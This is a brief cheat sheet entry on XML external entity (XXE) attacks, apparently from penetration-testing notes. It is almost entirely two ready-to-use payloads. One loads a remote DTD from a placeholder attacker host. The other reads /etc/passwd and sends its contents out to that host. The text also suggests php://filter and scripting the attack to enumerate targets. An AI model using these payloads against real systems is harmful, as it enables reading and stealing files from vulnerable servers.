# XXE

### Common XXE 

Sends file on target system to us:

```markup
<?xml version="1.0"?>
<!DOCTYPE xct[
    <!ELEMENT xct ANY>
    <!ENTITY % dtd SYSTEM "http://<attackerip>/payload.dtd">
%dtd;]>
<xct></xct>
```

```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://<attackerip>/collect=%file'>">
%all
```

Instead of File we could also use `php://filter` here. You probably want to script this for enumerating a target.

